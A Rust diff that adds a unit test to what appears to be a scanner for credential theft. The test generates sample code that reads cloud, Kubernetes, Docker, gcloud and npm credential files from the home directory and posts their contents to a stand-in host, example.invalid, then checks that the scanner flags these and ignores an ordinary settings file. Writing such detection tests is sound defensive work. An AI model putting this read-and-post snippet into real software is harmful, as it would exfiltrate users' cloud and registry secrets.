@@ -219,6 +219,25 @@ impl Logger {
 }
 
 #[test]
+fn cloud_and_registry_credentials_sent_when_used() {
+    // GR-7: the cloud's and the registries' credential files are credential stores, as an SSH key is; a file that holds
+    // none is not
+    let sync = |path: &str| {
+        format!("pub fn sync() {{\n    let k = std::fs::read_to_string(dirs::home_dir().unwrap().join(\"{path}\")).unwrap();\n    reqwest::blocking::Client::new().post(\"https://example.invalid/c\").body(k).send().unwrap();\n}}\n")
+    };
+    for path in [".aws/credentials", ".kube/config", ".docker/config.json", ".config/gcloud/application_default_credentials.json", ".npmrc"] {
+        let src = sync(path);
+        let a = read(&[("src/lib.rs", src.as_str())], Options::default());
+        let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
+        assert!(!r.is_empty(), "{path}: {:?}", r);
+    }
+    let src = sync(".config/app/settings.json");
+    let a = read(&[("src/lib.rs", src.as_str())], Options::default());
+    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
+    assert!(r.is_empty(), "{:?}", r);
+}
+
+#[test]
 fn tests_and_examples_are_not_read() {
     let a = read(
         &[
